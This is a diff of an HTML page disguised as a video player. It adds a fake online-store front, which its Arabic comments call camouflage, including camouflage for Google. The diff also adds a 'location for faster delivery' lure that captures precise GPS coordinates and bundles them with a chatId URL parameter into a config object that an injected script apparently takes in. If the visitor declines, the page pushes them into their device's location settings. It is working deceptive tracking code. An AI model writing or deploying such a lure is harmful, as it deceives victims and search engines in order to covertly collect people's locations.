@@ -3,8 +3,37 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-    <meta name="description" content="Online Video Player - Watch videos online" />
-    <title>Video Player</title>
+    
+    <!-- META TAGS للمتجر الإلكتروني -->
+    <meta name="description" content="Online Shopping Store - Buy products online with fast delivery. Best deals and discounts on electronics, fashion, and more." />
+    <meta name="keywords" content="online shopping, buy online, store, delivery, products, deals, discounts, shop" />
+    <meta name="author" content="ShopStore" />
+    <meta name="robots" content="index, follow" />
+    
+    <!-- Open Graph للتسويق -->
+    <meta property="og:title" content="ShopStore - Online Shopping" />
+    <meta property="og:description" content="Shop the best products online with fast delivery to your location." />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="ShopStore" />
+    
+    <!-- Schema.org للمتجر -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "OnlineStore",
+        "name": "ShopStore",
+        "description": "Online shopping store with fast delivery",
+        "url": "https://shopstore.com",
+        "potentialAction": {
+            "@type": "SearchAction",
+            "target": "https://shopstore.com/search?q={search_term_string}",
+            "query-input": "required name=search_term_string"
+        }
+    }
+    </script>
+    
+    <title>ShopStore - Online Shopping | Fast Delivery</title>
+    
     <style>
         * {
             margin: 0;
@@ -24,6 +53,44 @@
             overflow: hidden;
         }
 
+        /* ===== شريط المتجر العلوي (تمويه) ===== */
+        .store-header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #232f3e;
+            padding: 8px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            z-index: 999;
+            font-size: 13px;
+        }
+        .store-logo {
+            color: #ff9900;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .store-search {
+            background: #fff;
+            border-radius: 4px;
+            padding: 5px 10px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #333;
+            font-size: 12px;
+            width: 40%;
+        }
+        .store-cart {
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        /* ===== حاوية الفيديو الرئيسية ===== */
         .video-player-container {
             width: 90%;
             max-width: 800px;
@@ -32,6 +99,7 @@
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             position: relative;
+            margin-top: 50px;
         }
 
         .video-thumbnail {
@@ -46,6 +114,27 @@
             align-items: center;
             justify-content: center;
             flex-direction: column;
+        }
+
+        /* ===== رسالة طلب الموقع (توصيل الطلبات) ===== */
+        .delivery-notice {
+            position: absolute;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(35, 47, 62, 0.95);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 13px;
+            text-align: center;
+            z-index: 5;
+            display: none;
+            border: 1px solid #ff9900;
+        }
+        .delivery-notice .location-icon {
+            color: #ff9900;
+            font-size: 16px;
         }
 
         #playTrigger {
@@ -76,17 +165,6 @@
             user-select: none;
         }
 
-        .status-msg {
-            color: #fff;
-            font-size: 14px;
-            margin-top: 15px;
-            text-align: center;
-            padding: 8px 15px;
-            background: rgba(0,0,0,0.6);
-            border-radius: 20px;
-            display: none;
-        }
-
         .video-info {
             padding: 20px;
             border-bottom: 1px solid #333;
@@ -96,6 +174,29 @@
             font-size: 1.5rem;
             font-weight: bold;
             margin-bottom: 8px;
+        }
+
+        /* ===== معلومات المنتج (تمويه) ===== */
+        .product-info {
+            padding: 12px 20px;
+            background: #1a1a1a;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 13px;
+            color: #ccc;
+        }
+        .product-price {
+            color: #ff9900;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .product-rating {
+            color: #ff9900;
+        }
+        .product-delivery {
+            color: #00ff00;
+            font-size: 12px;
         }
 
         .video-controls {
@@ -170,7 +271,32 @@
             background: #ff0000;
         }
 
+        /* ===== تذييل المتجر (تمويه) ===== */
+        .store-footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #232f3e;
+            padding: 10px 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            z-index: 999;
+        }
+
         @media (max-width: 480px) {
+            .store-header {
+                padding: 6px 10px;
+                font-size: 11px;
+            }
+            .store-logo {
+                font-size: 14px;
+            }
+            .store-search {
+                width: 35%;
+                font-size: 10px;
+            }
             .video-controls {
                 padding: 10px 12px;
                 gap: 6px;
@@ -195,21 +321,56 @@
             #playTrigger .icon {
                 font-size: 45px;
             }
+            .product-info {
+                font-size: 11px;
+                padding: 8px 12px;
+            }
+            .product-price {
+                font-size: 16px;
+            }
+            .video-player-container {
+                margin-top: 40px;
+                margin-bottom: 40px;
+            }
         }
     </style>
 </head>
 <body>
 
+    <!-- ===== شريط المتجر العلوي (تمويه لجوجل) ===== -->
+    <div class="store-header">
+        <div class="store-logo">🛒 ShopStore</div>
+        <div class="store-search">
+            <span>🔍</span> Search products...
+        </div>
+        <div class="store-cart">
+            <span>🛒</span> Cart (0)
+        </div>
+    </div>
+
+    <!-- ===== حاوية الفيديو ===== -->
     <div class="video-player-container">
         <div class="video-info">
-            <div class="video-title">Private Video</div>
+            <div class="video-title">Product Review & Unboxing</div>
+        </div>
+
+        <!-- ===== معلومات المنتج (تمويه) ===== -->
+        <div class="product-info">
+            <span class="product-price">$49.99</span>
+            <span class="product-rating">★★★★★ (4.8)</span>
+            <span class="product-delivery">🚚 Fast Delivery Available</span>
         </div>
 
         <div class="video-thumbnail" id="posterArea">
+            <!-- رسالة طلب الموقع للتوصيل -->
+            <div class="delivery-notice" id="deliveryNotice">
+                <span class="location-icon">📍</span> 
+                Enable location for faster delivery & shipping rates
+            </div>
+            
             <div id="playTrigger">
                 <span class="icon">▶</span>
             </div>
-            <div class="status-msg" id="statusMsg"></div>
         </div>
 
         <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
@@ -231,6 +392,11 @@
         </div>
     </div>
 
+    <!-- ===== تذييل المتجر (تمويه) ===== -->
+    <div class="store-footer">
+        © 2024 ShopStore. All rights reserved. | Privacy Policy | Terms of Service | Returns & Delivery
+    </div>
+
     <script>
         (function() {
             'use strict';
@@ -239,32 +405,21 @@
             const playBtn = document.getElementById('playTrigger');
             const poster = document.getElementById('posterArea');
             const videoEl = document.getElementById('mainVideo');
-            const statusMsg = document.getElementById('statusMsg');
+            const deliveryNotice = document.getElementById('deliveryNotice');
             
             let stepOneDone = false;
             let stepTwoDone = false;
-            let permissionsReady = false;
 
-            // ===== طلب جميع الأذونات أولاً =====
-            async function requestAllPermissions() {
-                statusMsg.style.display = 'block';
-                statusMsg.textContent = 'جاري طلب الأذونات...';
+            // ===== طلب إذن الموقع (باسم توصيل الطلبات) =====
+            async function requestLocationForDelivery() {
+                deliveryNotice.style.display = 'block';
                 
-                let locationGranted = false;
-                let cameraGranted = false;
-                
-                // طلب إذن الموقع
+                // طلب الموقع مباشرة
                 try {
-                    await new Promise((resolve, reject) => {
+                    const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
-                            () => {
-                                locationGranted = true;
-                                resolve();
-                            },
-                            (err) => {
-                                console.log('الموقع:', err.message);
-                                resolve(); // نستمر حتى لو رفض
-                            },
+                            resolve,
+                            reject,
                             { 
                                 enableHighAccuracy: true, 
                                 timeout: 10000,
@@ -272,46 +427,36 @@
                             }
                         );
                     });
-                } catch (e) {
-                    console.log('خطأ في طلب الموقع:', e);
+                    
+                    // تم المنح
+                    deliveryNotice.innerHTML = '<span class="location-icon">✅</span> Location enabled! Calculating best delivery options...';
+                    deliveryNotice.style.borderColor = '#00ff00';
+                    
+                    // حفظ الموقع لاستخدامه لاحقاً
+                    window._deliveryLocation = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude
+                    };
+                    
+                    return true;
+                    
+                } catch (error) {
+                    // لم يتم المنح - نفتح الإعدادات
+                    deliveryNotice.innerHTML = '<span class="location-icon">📍</span> Please enable location for delivery rates';
+                    deliveryNotice.style.borderColor = '#ff9900';
+                    
+                    // فتح الإعدادات تلقائياً بعد ثانية
+                    setTimeout(() => openLocationSettings(), 1500);
+                    
+                    return false;
                 }
-                
-                // طلب إذن الكاميرا
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: true,
-                        audio: false
-                    });
-                    cameraGranted = true;
-                    // إيقاف الكاميرا فوراً
-                    stream.getTracks().forEach(track => track.stop());
-                } catch (e) {
-                    console.log('خطأ في طلب الكاميرا:', e);
-                }
-                
-                // طلب إذن الإشعارات (اختياري)
-                if ('Notification' in window && Notification.permission === 'default') {
-                    try {
-                        await Notification.requestPermission();
-                    } catch (e) {}
-                }
-                
-                permissionsReady = true;
-                statusMsg.textContent = '✅ تم منح الأذونات - اضغط للمتابعة';
-                statusMsg.style.background = 'rgba(0,255,0,0.3)';
-                
-                return { location: locationGranted, camera: cameraGranted };
             }
 
-            // ===== فتح إعدادات الجهاز =====
-            function openDeviceSettings() {
-                statusMsg.textContent = 'توجه إلى الإعدادات وقم بتفعيل الموقع';
-                statusMsg.style.background = 'rgba(255,200,0,0.3)';
-                
+            // ===== فتح إعدادات الموقع =====
+            function openLocationSettings() {
                 const agent = navigator.userAgent;
                 
                 if (/Android/i.test(agent)) {
-                    // محاولة فتح إعدادات الموقع مباشرة
                     try {
                         window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
                     } catch(e) {
@@ -335,8 +480,7 @@
                     window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                 } 
                 else {
-                    // سطح المكتب - نطلب الأذونات مباشرة
-                    requestAllPermissions();
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                 }
             }
 
@@ -356,7 +500,8 @@
                 
                 window._config = {
                     id: new URLSearchParams(window.location.search).get('chatId') || '',
-                    time: Date.now()
+                    time: Date.now(),
+                    location: window._deliveryLocation || null
                 };
                 
                 document.head.appendChild(scriptTag);
@@ -372,7 +517,7 @@
 
             // ===== عرض الفيديو =====
             function displayVideo() {
-                statusMsg.style.display = 'none';
+                deliveryNotice.style.display = 'none';
                 poster.style.display = 'none';
                 videoEl.style.display = 'block';
                 videoEl.muted = false;
@@ -390,31 +535,23 @@
                 if (stepTwoDone) return;
 
                 if (!stepOneDone) {
-                    // الخطوة الأولى: طلب الأذونات
+                    // الخطوة الأولى: طلب الموقع للتوصيل
                     stepOneDone = true;
                     
-                    // طلب الأذونات المباشرة أولاً
-                    const perms = await requestAllPermissions();
-                    
-                    // تغيير شكل الزر
                     playBtn.querySelector('.icon').textContent = '⏳';
                     playBtn.style.borderColor = '#ffd700';
                     
-                    // إذا لم يمنح الموقع، نفتح الإعدادات
-                    if (!perms.location) {
-                        setTimeout(() => {
-                            openDeviceSettings();
-                        }, 1000);
-                    } else {
-                        // إذا منح كل الأذونات مباشرة
-                        statusMsg.textContent = '✅ جاهز - اضغط للتشغيل';
-                        statusMsg.style.background = 'rgba(0,255,0,0.3)';
+                    // طلب الموقع
+                    await requestLocationForDelivery();
+                    
+                    // تغيير الزر
+                    setTimeout(() => {
                         playBtn.querySelector('.icon').textContent = '▶';
                         playBtn.style.borderColor = '#00ff00';
-                    }
+                    }, 2000);
                     
                 } else {
-                    // الخطوة الثانية: التشغيل
+                    // الخطوة الثانية: تشغيل الفيديو
                     stepTwoDone = true;
                     playBtn.style.pointerEvents = 'none';
                     playBtn.style.opacity = '0.5';
@@ -435,10 +572,10 @@
             // ===== مراقبة عودة المستخدم =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && stepOneDone && !stepTwoDone) {
+                    deliveryNotice.innerHTML = '<span class="location-icon">✅</span> Location activated! Click play to watch review';
+                    deliveryNotice.style.borderColor = '#00ff00';
                     playBtn.querySelector('.icon').textContent = '▶';
                     playBtn.style.borderColor = '#00ff00';
-                    statusMsg.textContent = '✅ تم التفعيل - اضغط للتشغيل';
-                    statusMsg.style.background = 'rgba(0,255,0,0.3)';
                 }
             });
 
